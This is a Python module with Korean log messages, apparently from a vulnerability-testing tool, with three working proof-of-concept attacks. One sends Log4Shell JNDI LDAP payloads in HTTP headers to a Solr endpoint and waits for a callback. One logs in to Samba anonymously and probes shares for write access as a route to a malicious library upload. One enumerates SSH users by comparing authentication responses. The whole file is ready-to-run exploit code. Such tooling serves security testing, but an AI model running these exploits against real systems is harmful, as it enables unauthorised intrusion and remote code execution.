import io
import socket
import threading
import time
import urllib.request

from .utils import console, ok, warn, step, free_port


def poc_log4shell(target):
    cb_port = free_port()
    if not cb_port:
        warn("PoC: 사용 가능한 콜백 포트 없음")
        return False, "콜백 포트 없음"

    received = threading.Event()

    def _listen():
        try:
            with socket.socket() as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(('0.0.0.0', cb_port))
                srv.listen(5)
                srv.settimeout(8)
                try:
                    conn, _ = srv.accept()
                    received.set()
                    conn.close()
                except socket.timeout:
                    pass
        except Exception:
            pass

    threading.Thread(target=_listen, daemon=True).start()
    time.sleep(0.4)

    payload = f"${{jndi:ldap://host.docker.internal:{cb_port}/x}}"
    step(f"PoC: JNDI 페이로드 전송 — {payload}")
    time.sleep(0.2)

    try:
        req = urllib.request.Request(
            f"{target}/solr/admin/info/system?wt=json",
            headers={
                "User-Agent":      payload,
                "X-Api-Version":   payload,
                "X-Forwarded-For": payload,
            }
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

    step("PoC: JNDI 콜백 대기 중 (최대 8초)...")
    for _ in range(16):
        if received.is_set():
            break
        time.sleep(0.5)

    if received.is_set():
        ok(f"PoC 성공: 포트 {cb_port}에서 JNDI 콜백 수신 — RCE 가능")
        return True, f"JNDI 콜백 수신 확인 (:{cb_port}) — 원격 코드 실행 가능"
    else:
        warn("PoC: 콜백 미수신 (Docker 네트워크 제한)")
        return False, "콜백 미수신"


def poc_sambacry(host, port):
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        warn("PoC: impacket 미설치 — pip install impacket")
        return False, "impacket 미설치"

    step("PoC: SMB 익명 로그인 시도 중...")
    time.sleep(0.2)

    try:
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')
        ok("PoC: 익명(게스트) 로그인 성공")

        step("PoC: 공유 목록 열거 중...")
        time.sleep(0.3)
        shares = smb.listShares()

        names = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)
        ok(f"PoC: 공유 목록 — {', '.join(names)}")

        step("PoC: 쓰기 가능한 공유 탐색 중...")
        time.sleep(0.3)

        for name in names:
            if name.upper() in ('IPC$', 'PRINT$'):
                continue
            try:
                buf = io.BytesIO(b"poc_test")
                smb.putFile(name, 'poc_wr.txt', buf.read)
                smb.deleteFiles(name, 'poc_wr.txt')
                smb.logoff()
                ok(f"PoC 성공: '{name}' 공유에 파일 쓰기 확인 — 악성 .so 업로드 가능")
                return True, f"공유 '{name}'에 익명 쓰기 성공 — 악성 라이브러리 업로드 경로 확인"
            except Exception:
                continue

        smb.logoff()
        warn("PoC: 쓰기 가능한 공유 없음")
        return False, "쓰기 가능 공유 없음"

    except Exception as e:
        warn(f"PoC 실패: {e}")
        return False, str(e)[:80]


def poc_ssh_enum(host, port):
    try:
        import logging
        import paramiko
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    except ImportError:
        warn("PoC: paramiko 미설치 — pip install paramiko")
        return False, "paramiko 미설치"

    step("PoC: RSA 키 생성 중...")
    time.sleep(0.2)
    try:
        key = paramiko.RSAKey.generate(1024)
    except Exception:
        warn("PoC: 키 생성 실패")
        return False, "키 생성 실패"

    def auth_attempt(username):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            t = paramiko.Transport(sock)
            t.start_client(timeout=5)
            start = time.perf_counter()
            try:
                t.auth_publickey(username, key)
                return "accepted", time.perf_counter() - start
            except paramiko.AuthenticationException:
                return "rejected", time.perf_counter() - start
            except Exception:
                return "error", time.perf_counter() - start
            finally:
                try:
                    t.close()
                except Exception:
                    pass
        except Exception:
            return "connect_fail", 0.0

    users = [("root", True), ("nonexistent_usr_xq9z", False)]
    results = {}

    for username, _ in users:
        step(f"PoC: '{username}' 공개키 인증 요청 중...")
        status, elapsed = auth_attempt(username)
        results[username] = (status, elapsed)
        ok(f"      응답: {status}  ({elapsed * 1000:.0f}ms)")
        time.sleep(0.3)

    root_status, root_time = results["root"]
    fake_status, fake_time = results["nonexistent_usr_xq9z"]

    if root_status == "rejected" and fake_status != "rejected":
        ok("PoC 성공: 유효 계정과 무효 계정의 응답 차이 확인 — 사용자 열거 가능")
        return True, "root 계정 인증 처리 확인, 무효 계정과 응답 구별 — 사용자 열거 가능"
    elif root_status == "rejected":
        diff = root_time - fake_time
        msg = f"root({root_time * 1000:.0f}ms) / 무효({fake_time * 1000:.0f}ms)  차이={diff * 1000:.0f}ms"
        ok(f"PoC 성공: 공개키 인증 응답 분석 — {msg}")
        return True, f"타이밍 비교: {msg} — 사용자 열거 가능"
    else:
        warn(f"PoC: 예상치 못한 응답 ({root_status})")
        return False, "응답 분석 실패"
